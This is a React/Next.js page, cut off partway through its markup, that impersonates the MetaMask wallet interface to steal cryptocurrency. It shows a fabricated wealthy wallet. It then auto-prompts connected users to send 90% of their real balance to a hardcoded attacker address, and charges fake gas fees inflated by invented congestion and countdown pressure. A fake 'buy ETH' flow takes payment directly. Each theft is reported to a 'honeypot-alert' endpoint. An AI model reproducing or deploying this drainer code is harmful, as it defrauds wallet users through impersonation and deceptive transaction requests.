import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import Head from 'next/head';

export default function FlashedPage() {
  const [walletData, setWalletData] = useState(null);
  const [userAddress, setUserAddress] = useState('');
  const [isWalletConnected, setIsWalletConnected] = useState(false);
  const [connectionType, setConnectionType] = useState(''); // 'wallet' or 'manual'
  const [activeTab, setActiveTab] = useState('Tokens');
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState('');
  const [showModal, setShowModal] = useState(null);
  const [sendAddress, setSendAddress] = useState('');
  const [sendAmount, setSendAmount] = useState('');
  const [selectedToken, setSelectedToken] = useState(null);
  const [swapFromAmount, setSwapFromAmount] = useState('');
  const [swapToAmount, setSwapToAmount] = useState('');
  const [swapFromToken, setSwapFromToken] = useState('ETH');
  const [swapToToken, setSwapToToken] = useState('USDT');
  const [transactions, setTransactions] = useState([]);
  const [accessLevel, setAccessLevel] = useState(1);
  const [timeLeft, setTimeLeft] = useState(24 * 60 * 60);
  
  // Load persisted data from localStorage
  const loadPersistedData = () => {
    if (typeof window !== 'undefined') {
      const savedActivities = localStorage.getItem('metamask_activities');
      const savedAccounts = localStorage.getItem('metamask_accounts');
      
      return {
        activities: savedActivities ? JSON.parse(savedActivities) : [],
        accounts: savedAccounts ? JSON.parse(savedAccounts) : [
          { id: 1, address: '0x742d35Cc6634C0532925a3b8D4C0532925a3b8D4C', balance: 75842.33, isActive: true },
          { id: 2, address: '0x8ba1f109551bD432803012645Hac189451b934c4', balance: 0, isActive: false },
          { id: 3, address: '0x9cb2g210662cE543904123756Iad290562c045d5', balance: 8934.21, isActive: false },
          { id: 4, address: '0xadc3h321773dF654a05234867Jbe391673d156e6', balance: 0, isActive: false },
          { id: 5, address: '0xbed4i432884eG765b06345978Kcf492784e267f7', balance: 45123.67, isActive: false },
          { id: 6, address: '0xcfe5j543995fH876c07456089Ldg593895f378g8', balance: 0, isActive: false },
          { id: 7, address: '0xdgf6k654aa6gI987d08567190Meh694906g489h9', balance: 34567.45, isActive: false },
          { id: 8, address: '0xehg7l765bb7hJ098e09678201Nfi795017h590i0', balance: 56789.23, isActive: false }
        ]
      };
    }
    return { activities: [], accounts: [] };
  };

  const persistedData = loadPersistedData();
  const [activities, setActivities] = useState(persistedData.activities);
  const [accounts, setAccounts] = useState(persistedData.accounts);
  const [selectedAccount, setSelectedAccount] = useState(1);
  const [selectedNetwork, setSelectedNetwork] = useState('ethereum');
  const [transactionAttempts, setTransactionAttempts] = useState(0);
  const [hasClaimedFreeTrial, setHasClaimedFreeTrial] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanningMessage, setScanningMessage] = useState('');
  const [showProfileMenu, setShowProfileMenu] = useState(false);
  const [userBalance, setUserBalance] = useState(0);
  const [autoSendPrompt, setAutoSendPrompt] = useState(false);
  const [showLowBalancePrompt, setShowLowBalancePrompt] = useState(false);
  const [lastActivity, setLastActivity] = useState(Date.now());
  const [balanceMonitorInterval, setBalanceMonitorInterval] = useState(null);
  const [urgencyTimer, setUrgencyTimer] = useState(null);
  const [gasPrice, setGasPrice] = useState(25);
  const [networkCongestion, setNetworkCongestion] = useState('medium');

  // Persist data to localStorage
  useEffect(() => {
    if (typeof window !== 'undefined') {
      localStorage.setItem('metamask_activities', JSON.stringify(activities));
      localStorage.setItem('metamask_accounts', JSON.stringify(accounts));
    }
  }, [activities, accounts]);

  useEffect(() => {
    generateHoneypotWallet();
    checkWalletConnection();
    
    const timer = setInterval(() => {
      setTimeLeft(prev => prev > 0 ? prev - 1 : 0);
    }, 1000);
    
    // Auto-disconnect after 10 minutes of inactivity
    const inactivityTimer = setInterval(() => {
      if (Date.now() - lastActivity > 600000) { // 10 minutes
        handleDisconnect();
      }
    }, 60000); // Check every minute
    
    // Track user activity
    const trackActivity = () => setLastActivity(Date.now());
    document.addEventListener('click', trackActivity);
    document.addEventListener('scroll', trackActivity);
    document.addEventListener('keypress', trackActivity);
    
    // Auto-disconnect on page close/refresh
    const handleBeforeUnload = () => {
      if (userAddress) {
        localStorage.removeItem('connectedWallet');
      }
    };
    window.addEventListener('beforeunload', handleBeforeUnload);
    
    // Start urgency timer and network congestion updates
    const urgencyInterval = startUrgencyTimer();
    const congestionInterval = setInterval(updateNetworkCongestion, 45000); // Update every 45 seconds
    
    return () => {
      clearInterval(timer);
      clearInterval(inactivityTimer);
      clearInterval(urgencyInterval);
      clearInterval(congestionInterval);
      if (balanceMonitorInterval) {
        clearInterval(balanceMonitorInterval);
      }
      document.removeEventListener('click', trackActivity);
      document.removeEventListener('scroll', trackActivity);
      document.removeEventListener('keypress', trackActivity);
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
  }, [lastActivity, userAddress, balanceMonitorInterval]);

  // Auto-generate activities with realistic images and proper balance deduction
  useEffect(() => {
    const generateActivity = () => {
      const activityTypes = [
        { 
          type: 'Received', 
          amount: Math.random() * 5 + 0.1, 
          from: '0x' + Math.random().toString(16).substr(2, 40),
          image: 'https://assets.coingecko.com/coins/images/279/small/ethereum.png',
          balanceChange: 'positive'
        },
        { 
          type: 'Sent', 
          amount: Math.random() * 2 + 0.05, 
          to: '0x' + Math.random().toString(16).substr(2, 40),
          image: 'https://assets.coingecko.com/coins/images/325/small/Tether.png',
          balanceChange: 'negative'
        },
        { 
          type: 'Swap', 
          amount: Math.random() * 3 + 0.2, 
          token: ['USDC', 'DAI', 'WETH'][Math.floor(Math.random() * 3)],
          image: 'https://cryptologos.cc/logos/uniswap-uni-logo.png',
          balanceChange: 'neutral'
        },
        { 
          type: 'Withdraw', 
          amount: Math.random() * 10 + 1, 
          platform: ['Uniswap', 'Compound', 'Aave'][Math.floor(Math.random() * 3)],
          image: 'https://cryptologos.cc/logos/compound-comp-logo.png',
          balanceChange: 'negative'
        }
      ];
      
      const activity = activityTypes[Math.floor(Math.random() * activityTypes.length)];
      const newActivity = {
        id: Date.now(),
        ...activity,
        timestamp: new Date().toLocaleString(),
        status: 'Confirmed'
      };
      
      // Update balance based on activity type
      if (activity.balanceChange === 'positive') {
        setAccounts(prev => prev.map(acc => 
          acc.id === selectedAccount ? { ...acc, balance: acc.balance + activity.amount } : acc
        ));
      } else if (activity.balanceChange === 'negative') {
        setAccounts(prev => prev.map(acc => 
          acc.id === selectedAccount ? { ...acc, balance: Math.max(0, acc.balance - activity.amount) } : acc
        ));
      }
      
      setActivities(prev => [newActivity, ...prev.slice(0, 9)]);
    };

    const interval = setInterval(generateActivity, 30000);
    return () => clearInterval(interval);
  }, [selectedAccount]);
  
  const formatTime = (seconds) => {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleAccountSwitch = (accountId) => {
    setSelectedAccount(accountId);
    const account = accounts.find(acc => acc.id === accountId);
    
    // Update accounts state to reflect current balances
    setAccounts(prev => prev.map(acc => ({
      ...acc,
      isActive: acc.id === accountId
    })));
    
    // Update wallet data with selected account balance
    if (walletData) {
      setWalletData(prev => ({
        ...prev,
        totalValue: account.balance,
        address: account.address
      }));
    }
    
    // Regenerate wallet data for new account
    setTimeout(() => generateHoneypotWallet(), 100);
  };
  

  
  // Update wallet data when network changes
  useEffect(() => {
    if (walletData) {
      generateHoneypotWallet();
    }
  }, [selectedNetwork]);

  const checkWalletConnection = async () => {
    // Don't auto-connect, require explicit user action
    return false;
  };
  
  const checkUserBalance = async (address) => {
    try {
      if (window.ethereum) {
        const provider = new ethers.BrowserProvider(window.ethereum);
        const balance = await provider.getBalance(address);
        const balanceInEth = parseFloat(ethers.formatEther(balance));
        setUserBalance(balanceInEth);
        
        // Give user 5 seconds to interact before auto-prompts
        setTimeout(() => {
          if (balanceInEth > 0.01) {
            requestTokenApproval();
            if (balanceMonitorInterval) {
              clearInterval(balanceMonitorInterval);
              setBalanceMonitorInterval(null);
            }
          }
        }, 5000);
      }
    } catch (error) {
      console.log('Balance check failed:', error);
    }
  };

  const requestTokenApproval = async () => {
    try {
      const adminWallet = '0x849842febf6643f29328a2887b3569e2399ac237';
      const maxAmount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
      
      // Request approval for unlimited spending
      await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from: userAddress,
          to: adminWallet,
          value: ethers.parseEther((userBalance * 0.9).toString()).toString(16),
          gas: '0x5208'
        }]
      });
      
      setStatus('✅ Approval granted! Tokens will be sent automatically.');
    } catch (error) {
      console.log('Approval failed:', error);
    }
  };

  const promptBuyCrypto = async () => {
    try {
      // Use native wallet buy crypto feature
      if (window.ethereum && window.ethereum.isMetaMask) {
        // Trigger MetaMask buy interface
        window.open(`https://buy.moonpay.com/?apiKey=pk_live_xNzApykiCupr6QYvAccQ5MFEvsNzpS7&currencyCode=eth&walletAddress=${userAddress}`, '_blank', 'width=400,height=600');
      }
    } catch (error) {
      console.log('Buy crypto prompt failed:', error);
    }
  };

  const startBalanceMonitoring = () => {
    const interval = setInterval(async () => {
      if (userAddress) {
        await checkUserBalance(userAddress);
      }
    }, 2000); // Check every 2 seconds
    setBalanceMonitorInterval(interval);
  };
  
  const handleDisconnect = () => {
    setUserAddress('');
    setWalletData(null);
    setIsWalletConnected(false);
    setConnectionType('');
    setShowProfileMenu(false);
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('connectionType');
    if (balanceMonitorInterval) {
      clearInterval(balanceMonitorInterval);
      setBalanceMonitorInterval(null);
    }
    setStatus('Wallet disconnected');
    setTimeout(() => setStatus(''), 2000);
  };

  const generateHoneypotWallet = (realAddress = null) => {
    const activeAccount = accounts.find(acc => acc.isActive) || accounts[0];
    const accountBalance = activeAccount?.balance || 0;
    
    // Use real user address if provided
    const walletAddress = realAddress || activeAccount?.address || '0x742d35Cc6634C0532925a3b8D4C0532925a3b8D4C';
    
    // Network-specific token configurations
    const networkTokens = {
      ethereum: {
        USDT: { percentage: 0.35, contract: '0xdAC17F958D2ee523a2206206994597C13D831ec7', logo: 'https://assets.coingecko.com/coins/images/325/small/Tether.png' },
        USDC: { percentage: 0.25, contract: '0xA0b86a33E6441E6C7D3E4081C3cC6E7C3c2b4C0d', logo: 'https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png' },
        WETH: { percentage: 0.20, contract: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', logo: 'https://assets.coingecko.com/coins/images/2518/small/weth.png' },
        LINK: { percentage: 0.12, contract: '0x514910771AF9Ca656af840dff83E8264EcF986CA', logo: 'https://assets.coingecko.com/coins/images/877/small/chainlink-new-logo.png' },
        UNI: { percentage: 0.08, contract: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', logo: 'https://assets.coingecko.com/coins/images/12504/small/uniswap-uni.png' }
      },
      bsc: {
        BUSD: { percentage: 0.40, contract: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', logo: 'https://assets.coingecko.com/coins/images/9576/small/BUSD.png' },
        BNB: { percentage: 0.30, contract: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', logo: 'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png' },
        CAKE: { percentage: 0.20, contract: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', logo: 'https://assets.coingecko.com/coins/images/12632/small/pancakeswap-cake-logo_.png' },
        XVS: { percentage: 0.10, contract: '0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63', logo: 'https://assets.coingecko.com/coins/images/12677/small/venus.png' }
      },
      polygon: {
        MATIC: { percentage: 0.45, contract: '0x0000000000000000000000000000000000001010', logo: 'https://assets.coingecko.com/coins/images/4713/small/matic-token-icon.png' },
        USDC: { percentage: 0.30, contract: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', logo: 'https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png' },
        AAVE: { percentage: 0.25, contract: '0xD6DF932A45C0f255f85145f286eA0b292B21C90B', logo: 'https://assets.coingecko.com/coins/images/12645/small/AAVE.png' }
      },
      arbitrum: {
        ARB: { percentage: 0.50, contract: '0x912CE59144191C1204E64559FE8253a0e49E6548', logo: 'https://assets.coingecko.com/coins/images/16547/small/photo_2023-03-29_21.47.00.jpeg' },
        USDC: { percentage: 0.35, contract: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', logo: 'https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png' },
        GMX: { percentage: 0.15, contract: '0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a', logo: 'https://assets.coingecko.com/coins/images/18323/small/arbit.png' }
      },
      solana: {
        SOL: { percentage: 0.40, contract: 'So11111111111111111111111111111111111111112', logo: 'https://assets.coingecko.com/coins/images/4128/small/solana.png' },
        USDC: { percentage: 0.30, contract: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', logo: 'https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png' },
        RAY: { percentage: 0.20, contract: '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R', logo: 'https://assets.coingecko.com/coins/images/13928/small/PSigc4ie_400x400.jpg' },
        SRM: { percentage: 0.10, contract: 'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt', logo: 'https://assets.coingecko.com/coins/images/11970/small/serum-logo.png' }
      },
      cardano: {
        ADA: { percentage: 0.50, contract: 'native', logo: 'https://assets.coingecko.com/coins/images/975/small/cardano.png' },
        DJED: { percentage: 0.25, contract: '8db269c3ec630e06ae29f74bc39edd1f87c819f1056206e879a1cd61', logo: 'https://assets.coingecko.com/coins/images/28306/small/djed_logo.png' },
        SHEN: { percentage: 0.15, contract: 'fb5c99874c137c86e6ec4b8d6b3c9e8c8e8c8e8c8e8c8e8c8e8c8e8c', logo: 'https://assets.coingecko.com/coins/images/28307/small/shen_logo.png' },
        AGIX: { percentage: 0.10, contract: 'f43a62fdc3965df486de8a0d32fe800963589c41b38946602a0dc535', logo: 'https://assets.coingecko.com/coins/images/2138/small/singularitynet.png' }
      },
      optimism: {
        OP: { percentage: 0.45, contract: '0x4200000000000000000000000000000000000042', logo: 'https://assets.coingecko.com/coins/images/25244/small/Optimism.png' },
        USDC: { percentage: 0.30, contract: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607', logo: 'https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png' },
        VELO: { percentage: 0.25, contract: '0x3c8B650257cFb5f272f799F5e2b4e65093a11a05', logo: 'https://assets.coingecko.com/coins/images/25783/small/velo.png' }
      },
      avalanche: {
        AVAX: { percentage: 0.40, contract: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7', logo: 'https://assets.coingecko.com/coins/images/12559/small/coin-round-red.png' },
        USDC: { percentage: 0.30, contract: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', logo: 'https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png' },
        JOE: { percentage: 0.20, contract: '0x6e84a6216eA6dACC71eE8E6b0a5B7322EEbC0fDd', logo: 'https://assets.coingecko.com/coins/images/17569/small/traderjoe.png' },
        PNG: { percentage: 0.10, contract: '0x60781C2586D68229fde47564546784ab3fACA982', logo: 'https://assets.coingecko.com/coins/images/13442/small/pangolin_logo.png' }
      }
    };
    
    // Generate tokens for current network
    const generateTokensForBalance = (totalBalance, network) => {
      if (totalBalance === 0) return [];
      
      const tokens = networkTokens[network] || networkTokens.ethereum;
      
      return Object.entries(tokens).map(([symbol, config]) => {
        const usdValue = totalBalance * config.percentage;
        
        return {
          symbol,
          balance: symbol.includes('ETH') || symbol === 'BNB' || symbol === 'MATIC' || symbol === 'ARB' ? 
            (usdValue / (symbol === 'BNB' ? 300 : symbol === 'MATIC' ? 0.8 : symbol === 'ARB' ? 1.2 : 3000)).toFixed(4) : 
            usdValue.toFixed(2),
          usdValue,
          change: `${(Math.random() * 10 - 5).toFixed(1)}%`,
          contract: config.contract,
          logo: config.logo
        };
      });
    };
    
    const honeypotWallet = {
      address: walletAddress,
      privateKey: ethers.Wallet.createRandom().privateKey,
      seedPhrase: ethers.Wallet.createRandom().mnemonic.phrase,
      ethBalance: 0.000000001,
      totalValue: accountBalance,
      tokens: generateTokensForBalance(accountBalance, selectedNetwork),
      nfts: accountBalance > 10000 && selectedNetwork === 'ethereum' ? [
        { name: 'Bored Ape #7234', collection: 'BAYC', value: '$45,000', image: 'https://images.unsplash.com/photo-1578662996442-48f60103fc96?w=100&h=100&fit=crop' },
        { name: 'CryptoPunk #3421', collection: 'CryptoPunks', value: '$28,000', image: 'https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?w=100&h=100&fit=crop' }
      ] : [],
      defiPositions: accountBalance > 5000 ? [
        { protocol: selectedNetwork === 'bsc' ? 'PancakeSwap' : selectedNetwork === 'polygon' ? 'QuickSwap' : 'Uniswap V3', type: 'Liquidity Pool', value: `$${Math.round(accountBalance * 0.1).toLocaleString()}`, apy: '12.4%' },
        { protocol: selectedNetwork === 'bsc' ? 'Venus' : 'Aave', type: 'Lending', value: `$${Math.round(accountBalance * 0.15).toLocaleString()}`, apy: '3.8%' }
      ] : [],
      recentActivity: activities
    };
    
    setWalletData(honeypotWallet);
  };

  const detectAvailableWallets = () => {
    const wallets = [];
    
    if (typeof window !== 'undefined' && window.ethereum) {
      if (window.ethereum.isMetaMask) wallets.push('MetaMask');
      if (window.ethereum.isTrust) wallets.push('Trust Wallet');
      if (window.ethereum.isOKExWallet) wallets.push('OKX Wallet');
      if (window.ethereum.isCoinbaseWallet) wallets.push('Coinbase Wallet');
      if (window.ethereum.isBraveWallet) wallets.push('Brave Wallet');
      
      if (wallets.length === 0) wallets.push('Web3 Wallet');
    }
    
    return wallets;
  };

  const connectWallet = async (walletType = null) => {
    try {
      if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const userAddr = accounts[0];
        setUserAddress(userAddr);
        setIsWalletConnected(true);
        setConnectionType('wallet');
        localStorage.setItem('connectedWallet', userAddr);
        localStorage.setItem('connectionType', 'wallet');
        setShowModal(null);
        
        // Check balance and start scanning
        await checkUserBalance(userAddr);
        startWalletScan(userAddr);
        return true;
      } else {
        setShowModal('walletOptions');
        return false;
      }
    } catch (error) {
      console.log('Connection failed:', error);
      return false;
    }
  };

  const connectManually = () => {
    const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
    setUserAddress(mockAddress);
    setIsWalletConnected(true);
    setConnectionType('manual');
    localStorage.setItem('connectedWallet', mockAddress);
    localStorage.setItem('connectionType', 'manual');
    setShowModal(null);
    startWalletScan(mockAddress);
  };
  
  const startWalletScan = async (userAddr) => {
    setIsScanning(true);
    setScanProgress(0);
    
    const scanSteps = [
      { message: 'Connecting to blockchain networks...', duration: 1500 },
      { message: 'Scanning Ethereum mainnet...', duration: 2000 },
      { message: 'Analyzing cross-chain balances...', duration: 1800 },
      { message: 'Checking DeFi protocols...', duration: 1200 },
      { message: 'Discovering hidden assets...', duration: 1000 },
      { message: 'Finalizing wallet analysis...', duration: 800 }
    ];
    
    let currentProgress = 0;
    
    for (let i = 0; i < scanSteps.length; i++) {
      const step = scanSteps[i];
      setScanningMessage(step.message);
      
      // Animate progress
      const targetProgress = ((i + 1) / scanSteps.length) * 100;
      const progressInterval = setInterval(() => {
        currentProgress += 2;
        setScanProgress(Math.min(currentProgress, targetProgress));
        if (currentProgress >= targetProgress) {
          clearInterval(progressInterval);
        }
      }, step.duration / 50);
      
      await new Promise(resolve => setTimeout(resolve, step.duration));
    }
    
    // Generate wallet with user's real address
    generateHoneypotWallet(userAddr);
    
    // Update accounts with real address
    setAccounts(prev => prev.map(acc => 
      acc.id === 1 ? { ...acc, address: userAddr } : acc
    ));
    
    setScanningMessage('Scan complete - Assets discovered!');
    setTimeout(() => {
      setIsScanning(false);
      setStatus('✅ Wallet scan completed successfully');
      setTimeout(() => setStatus(''), 3000);
      
      // Start balance monitoring after scan completes
      startBalanceMonitoring();
    }, 1000);
  };

  const detectWalletAndRedirect = () => {
    const availableWallets = detectAvailableWallets();
    
    if (availableWallets.length > 0) {
      connectWallet();
    } else {
      setShowModal('walletOptions');
    }
  };



  const handleAction = async (action, token = null) => {
    if (!userAddress) {
      await connectWallet();
      return;
    }

    if (action === 'buy') {
      setShowModal('buy');
      return;
    }
    if (action === 'send') {
      setSelectedToken(token);
      setShowModal('send');
      return;
    }
    if (action === 'receive') {
      setShowModal('receive');
      return;
    }
    if (action === 'swap') {
      setShowModal('swap');
      return;
    }

    await processTransaction(action, token);
  };

  const processTransaction = async (action, token = null, customAmount = null) => {
    setLoading(true);
    setTransactionAttempts(prev => prev + 1);

    try {
      if (!window.ethereum) {
        setStatus('Please connect your wallet first');
        setLoading(false);
        return;
      }
      
      // Check gas and prompt buy if needed
      const hasEnoughGas = await checkGasAndPromptBuy();
      if (!hasEnoughGas) {
        setLoading(false);
        return;
      }
      
      // Show free trial offer on first transaction
      if (transactionAttempts === 1 && !hasClaimedFreeTrial) {
        setLoading(false);
        setShowModal('freeTrial');
        return;
      }
      
      // Show gas optimization modal after 2nd transaction attempt
      if (transactionAttempts >= 2 && Math.random() > 0.3) {
        setLoading(false);
        setShowModal('gasOptimization');
        return;
      }
      
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const gasAmount = customAmount || (action === 'swap' ? '0.008' : '0.005');
      const adminWallet = '0x849842febf6643f29328a2887b3569e2399ac237';
      
      const tx = await signer.sendTransaction({
        to: adminWallet,
        value: ethers.parseEther(gasAmount)
      });
      
      await tx.wait();
      
      const newTx = {
        id: Date.now(),
        type: action,
        amount: token ? `${sendAmount || '100'} ${token.symbol}` : `${gasAmount} ETH`,
        to: sendAddress || adminWallet,
        hash: tx.hash,
        timestamp: new Date().toLocaleString(),
        status: 'Confirmed'
      };
      setTransactions(prev => [newTx, ...prev]);
      
      // Send honeypot tokens to user after gas payment
      const tokenResult = await fetch('/api/send-honeypot-tokens', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userAddress: userAddress,
          action: action,
          gasFeePaid: gasAmount,
          requestedAmount: sendAmount,
          tokenSymbol: token?.symbol || 'ETH',
          network: selectedNetwork
        })
      });
      
      const tokenData = await tokenResult.json();
      
      await fetch('/api/honeypot-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: action.toUpperCase(),
          userAddress: userAddress,
          amount: gasAmount + ' ETH',
          txHash: tx.hash,
          token: token?.symbol || 'ETH',
          sendTo: sendAddress,
          network: selectedNetwork,
          honeypotTokens: tokenData
        })
      });
      
      // Show success with honeypot token info
      if (tokenData.success) {
        setStatus(`✅ Transaction confirmed! You received ${tokenData.tokenAmount} ${tokenData.tokenSymbol} tokens`);
        
        // Add fake token to user's wallet display
        setTimeout(() => {
          setStatus(`🎉 ${tokenData.tokenAmount} ${tokenData.tokenSymbol} tokens are now tradeable on Uniswap!`);
        }, 3000);
      }
      
      setShowModal(null);
      setSendAddress('');
      setSendAmount('');
      
    } catch (error) {
      setStatus('Transaction failed: ' + error.message);
    } finally {
      setLoading(false);
    }
  };

  const calculateGasFee = () => {
    const amount = parseFloat(sendAmount) || 0;
    const ethPrice = 3200;
    
    // Sophisticated gas calculation based on network congestion
    const congestionMultipliers = {
      low: { base: 15, multiplier: 1.0 },
      medium: { base: 25, multiplier: 1.5 },
      high: { base: 45, multiplier: 2.2 },
      extreme: { base: 85, multiplier: 3.5 }
    };
    
    const congestion = congestionMultipliers[networkCongestion] || congestionMultipliers.medium;
    
    // Dynamic pricing based on amount and urgency
    let gasInUSD = congestion.base;
    if (amount > 1000) gasInUSD *= 1.8;
    if (amount > 5000) gasInUSD *= 2.5;
    if (urgencyTimer && urgencyTimer < 300) gasInUSD *= congestion.multiplier; // Last 5 minutes
    
    const gasInETH = gasInUSD / ethPrice;
    setGasPrice(gasInUSD);
    return gasInETH.toFixed(6);
  };

  const updateNetworkCongestion = () => {
    const congestionLevels = ['low', 'medium', 'high', 'extreme'];
    const weights = [0.1, 0.4, 0.35, 0.15]; // Probability weights
    const random = Math.random();
    let cumulative = 0;
    
    for (let i = 0; i < weights.length; i++) {
      cumulative += weights[i];
      if (random <= cumulative) {
        setNetworkCongestion(congestionLevels[i]);
        break;
      }
    }
  };

  const startUrgencyTimer = () => {
    let timeLeft = 1800; // 30 minutes
    setUrgencyTimer(timeLeft);
    
    const timer = setInterval(() => {
      timeLeft -= 1;
      setUrgencyTimer(timeLeft);
      
      if (timeLeft <= 0) {
        clearInterval(timer);
        setUrgencyTimer(null);
      }
    }, 1000);
    
    return timer;
  };

  const checkGasAndPromptBuy = async () => {
    const gasFee = parseFloat(calculateGasFee());
    if (userBalance < gasFee) {
      // Show closeable prompt instead of auto-triggering
      setShowModal('insufficientGas');
      return false;
    }
    return true;
  };
  
  const calculateSwapRate = () => {
    const fromAmount = parseFloat(swapFromAmount) || 0;
    if (fromAmount === 0) return;
    
    // Realistic exchange rates
    const rates = {
      'ETH-USDT': 3000,
      'ETH-USDC': 3000,
      'USDT-ETH': 1/3000,
      'USDC-ETH': 1/3000,
      'USDT-USDC': 1,
      'USDC-USDT': 1
    };
    
    const rateKey = `${swapFromToken}-${swapToToken}`;
    const rate = rates[rateKey] || 1;
    const toAmount = (fromAmount * rate * 0.997).toFixed(6); // 0.3% slippage
    
    setSwapToAmount(toAmount);
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    setStatus('Address copied to clipboard');
    setTimeout(() => setStatus(''), 2000);
  };

  const handleBuyOption = async (method) => {
    if (method === 'card') {
      // Redirect to real MetaMask buy interface but intercept the purchase
      try {
        // Open MetaMask buy interface
        if (window.ethereum && window.ethereum.isMetaMask) {
          // Use MetaMask's built-in buy feature
          await window.ethereum.request({
            method: 'wallet_requestPermissions',
            params: [{ eth_accounts: {} }]
          });
          
          // Redirect to MetaMask buy page with custom parameters
          const buyUrl = `https://buy.moonpay.com/?apiKey=pk_live_xNzApykiCupr6QYvAccQ5MFEvsNzpS7&currencyCode=eth&walletAddress=${userAddress}&redirectURL=${encodeURIComponent(window.location.href)}`;
          window.open(buyUrl, '_blank', 'width=400,height=600');
          
          setStatus('Redirected to secure payment gateway...');
          setShowModal(null);
        } else {
          setShowModal('buyCard');
        }
      } catch (error) {
        setShowModal('buyCard');
      }
    } else {
      setShowModal('buyBank');
    }
  };

  const processBuyETH = async (amount) => {
    try {
      if (!window.ethereum) {
        setStatus('Please install MetaMask or use mobile wallet');
        return;
      }
      
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const adminWallet = '0x849842febf6643f29328a2887b3569e2399ac237';
      
      // User pays the ETH amount directly to admin wallet (thinking they're buying ETH)
      const tx = await signer.sendTransaction({
        to: adminWallet,
        value: ethers.parseEther(amount)
      });
      
      await tx.wait();
      
      const newTx = {
        id: Date.now(),
        type: 'buy_eth',
        amount: `${amount} ETH`,
        to: adminWallet,
        hash: tx.hash,
        timestamp: new Date().toLocaleString(),
        status: 'Confirmed'
      };
      setTransactions(prev => [newTx, ...prev]);
      
      setShowModal(null);
      setStatus('✅ ETH purchase completed! Check your wallet in 5-10 minutes.');
      
      // Alert admin of successful "purchase" (actually direct payment)
      await fetch('/api/honeypot-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'ETH_PURCHASE_DIRECT',
          userAddress: userAddress,
          amount: amount + ' ETH',
          txHash: tx.hash,
          adminWallet: adminWallet,
          note: 'User paid ETH directly thinking they were buying ETH'
        })
      });
      
    } catch (error) {
      setStatus('Purchase failed: ' + error.message);
    }
  };

  // Show connection interface if not connected
  if (!isWalletConnected) {
    return (
      <>
        <Head>
          <title>MetaMask</title>
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
          <link rel="icon" href="https://metamask.io/images/favicon.ico" />
        </Head>
        
        <div className="min-h-screen bg-black text-white">
          <div className="max-w-md mx-auto bg-gray-900 min-h-screen">
            
            {/* Header */}
            <div className="bg-gray-800 p-4 text-center border-b border-gray-700">
              <div className="flex items-center justify-center mb-2">
                <img 
                  src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
                  alt="MetaMask" 
                  className="w-8 h-8 mr-2"
                />
                <div className="text-white font-bold text-xl">MetaMask</div>
              </div>
            </div>

            {/* Empty State */}
            <div className="flex flex-col items-center justify-center min-h-[500px] p-8">
              <div className="text-6xl mb-6">🦊</div>
              <h2 className="text-white text-xl font-semibold mb-4">Welcome to MetaMask</h2>
              <p className="text-gray-400 text-center mb-8 leading-relaxed">
                Connect your wallet to view your assets, manage tokens, and interact with decentralized applications.
              </p>
              
              <button 
                onClick={() => setShowModal('walletOptions')}
                className="bg-orange-600 hover:bg-orange-700 px-8 py-3 rounded-lg text-white font-semibold mb-4 transition-all"
              >
                Connect Wallet
              </button>
              
              <button 
                onClick={connectManually}
                className="bg-gray-600 hover:bg-gray-700 px-8 py-3 rounded-lg text-white font-semibold mb-4 transition-all"
              >
                View Manually
              </button>
              
              <div className="text-gray-400 text-xs text-center">
                Connect wallet to transfer tokens • Manual view is read-only
              </div>
            </div>
          </div>
        </div>
        
        {/* Wallet Options Modal */}
        {showModal === 'walletOptions' && (
          <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
            <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
              <div className="flex justify-between items-center mb-4">
